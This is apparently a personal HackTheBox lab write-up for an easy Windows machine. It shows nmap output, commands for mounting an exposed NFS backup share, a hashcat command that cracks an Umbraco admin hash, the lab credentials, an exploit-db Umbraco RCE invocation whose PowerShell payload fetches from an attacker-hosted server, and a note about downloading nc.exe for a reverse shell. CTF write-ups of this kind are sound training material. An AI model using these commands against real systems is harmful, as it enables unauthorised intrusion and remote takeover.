
> HackTheBox easy machine #windows #misconfiguration 

# NMAP 

```shell
Host is up (0.076s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-08-24T12:02:34
|_  start_date: N/A
|_clock-skew: 59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

> port 2049 has a public nfs share /site-backups

```shell
showmount -e $IP
mount -t nfs <ip>:<remote_folder> <local_folder> -o nolock
```

> `showmount -e` displays all export shares
> `mount -t nfs` syncs a local directory to the mount 
 
>[hacktricks source](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)


> found credentials on the directory `/App_Data/Umbraco.sdf`
> the password was hashed, used hashcat to crack the password

```
hashcat -m 100 -a 0 hash wordlist --show
```


credentials
username: admin@htb.local
password: baconandcheese

> used a python exploit to trigger remote commands 
> [exploitdb](https://www.exploit-db.com/exploits/49488) 

```shell
python exploit.py -u admin@htb.local -p baconandcheese -i <URL> -c powershell.exe -a 'Invoke WebReqeust <HTTP-server>'
```
> I downloaded and executed nc.exe to initiate a reverse shell
> found a services (usosvc) that can be manipulated by normal user

